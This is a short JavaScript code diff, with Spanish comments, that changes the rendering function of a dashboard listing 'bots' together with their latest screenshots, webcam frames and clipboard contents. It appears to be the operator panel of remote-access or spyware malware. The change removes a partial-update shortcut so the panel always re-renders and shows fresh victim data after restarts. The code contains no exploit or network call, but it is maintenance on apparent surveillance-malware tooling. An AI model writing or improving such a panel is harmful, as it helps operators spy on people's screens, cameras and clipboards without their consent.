@@ -294,19 +294,8 @@ function renderDashboard() {
     const screenTime = bot.screenshots && bot.screenshots.length ? bot.screenshots[bot.screenshots.length-1].time : '—';
     const camTime = bot.cam_frames && bot.cam_frames.length ? bot.cam_frames[bot.cam_frames.length-1].time : '—';
 
-    // Si ya existe el dashboard para este bot, solo actualiza las partes dinámicas
-    const currBotEl = document.getElementById('current-bot-id');
-    if (currBotEl && currBotEl.dataset.botId === selected) {
-        
-        const clipEl = document.getElementById('clipboard-box');
-        if (clipEl) clipEl.textContent = info.clipboard_content || '[empty]';
-
-        const screenTimeEl = document.getElementById('screen-time');
-        if (screenTimeEl) screenTimeEl.textContent = screenTime;
-        const camTimeEl = document.getElementById('cam-time');
-        if (camTimeEl) camTimeEl.textContent = camTime;
-        return;
-    }
+    // Forzamos el re-render siempre para asegurar que la info se actualice tras reinicios
+    // (Quitamos el bloqueo de optimización que causaba que se viera N/A)
 
     document.getElementById('main').innerHTML = `
         <div id="current-bot-id" data-bot-id="${selected}" style="display:none;"></div>
